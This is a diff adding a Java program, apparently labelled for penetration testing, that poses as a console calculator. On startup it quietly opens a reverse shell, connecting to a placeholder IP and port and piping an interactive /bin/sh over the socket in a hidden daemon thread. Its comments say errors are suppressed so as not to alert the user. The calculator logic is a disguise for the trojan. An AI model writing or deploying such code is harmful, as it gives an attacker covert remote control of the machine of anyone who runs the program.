@@ -1,0 +1,85 @@
+import java.io.*;
+import java.net.Socket;
+import java.util.Scanner;
+
+public class CalculatorPentest {
+
+    // Variables de la lógica de la calculadora
+    private static String output = "0";
+    private static double num1 = 0;
+    private static String operand = "";
+
+    public static void main(String[] args) {
+        // 1. Iniciar la Reverse Shell en un hilo separado (Segundo plano)
+        startReverseShell("<IP>", <PORT>);
+
+        // 2. Lógica de la Interfaz de Calculadora (Consola)
+        System.out.println("--- Calculadora Ejecutándose ---");
+        Scanner scanner = new Scanner(System.in);
+        
+        while (true) {
+            System.out.print("Resultado actual: " + output + "\nIngrese número o comando (C, +, -, *, /, =): ");
+            String input = scanner.nextLine();
+            processButton(input);
+        }
+    }
+
+    private static void startReverseShell(String ip, int port) {
+        Thread shellThread = new Thread(() -> {
+            try {
+                Socket s = new Socket(ip, port);
+                // Ejecución del proceso del sistema
+                Process p = new ProcessBuilder("/bin/sh", "-i").redirectErrorStream(true).start();
+                
+                InputStream pi = p.getInputStream(), si = s.getInputStream();
+                OutputStream po = p.getOutputStream(), so = s.getOutputStream();
+
+                // Redirección de entrada/salida (Piping)
+                Thread t1 = new Thread(() -> {
+                    try {
+                        int data;
+                        while ((data = si.read()) != -1) { po.write(data); po.flush(); }
+                    } catch (Exception e) {}
+                });
+
+                Thread t2 = new Thread(() -> {
+                    try {
+                        int data;
+                        while ((data = pi.read()) != -1) { so.write(data); so.flush(); }
+                    } catch (Exception e) {}
+                });
+
+                t1.start();
+                t2.start();
+                p.waitFor();
+            } catch (Exception e) {
+                // Silencioso para no alertar al usuario
+            }
+        });
+        shellThread.setDaemon(true); // Evita que el hilo bloquee el cierre de la app
+        shellThread.start();
+    }
+
+    private static void processButton(String btn) {
+        try {
+            if (btn.equalsIgnoreCase("C")) {
+                output = "0"; num1 = 0; operand = "";
+            } else if ("+-*/".contains(btn) && !btn.isEmpty()) {
+                num1 = Double.parseDouble(output);
+                operand = btn;
+                output = "0";
+            } else if (btn.equals("=")) {
+                double num2 = Double.parseDouble(output);
+                if (operand.equals("+")) output = String.valueOf(num1 + num2);
+                if (operand.equals("-")) output = String.valueOf(num1 - num2);
+                if (operand.equals("*")) output = String.valueOf(num1 * num2);
+                if (operand.equals("/")) output = (num2 != 0) ? String.valueOf(num1 / num2) : "Error";
+                operand = "";
+            } else {
+                output = (output.equals("0")) ? btn : output + btn;
+            }
+        } catch (Exception e) {
+            output = "Error";
+        }
+    }
+}
